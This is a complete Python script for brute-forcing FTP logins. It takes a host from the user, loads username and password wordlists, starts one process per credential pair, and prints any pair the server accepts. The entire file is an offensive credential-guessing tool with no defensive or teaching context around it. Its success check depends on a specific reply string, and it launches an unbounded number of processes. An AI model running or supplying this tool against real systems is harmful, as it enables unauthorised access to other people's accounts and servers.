#!/usr/bin/env python3

import ftplib
import multiprocessing

def brute_force(ip_address,user,password):
    ftp = ftplib.FTP(ip_address)
    try:
        print("Testing user {}, password {}".format(user, password))
        response = ftp.login(user,password)
        if "230" in response and "access granted" in response:
            print("[*]Successful brute force")
            print("User: "+ user + " Password: "+password)
        else:
            pass
    except Exception as exception:
        print('Connection error', exception)

def main():
    ip_address = input("Enter IP address or host name:")
    with open('users.txt','r') as users:
        users = users.readlines()
    with open('passwords.txt','r') as passwords:
        passwords = passwords.readlines()
    for user in users:
        for password in passwords:
            process = multiprocessing.Process(target=brute_force,
            args=(ip_address,user.rstrip(),password.rstrip(),))
            process.start()
if __name__ == '__main__':
    main()
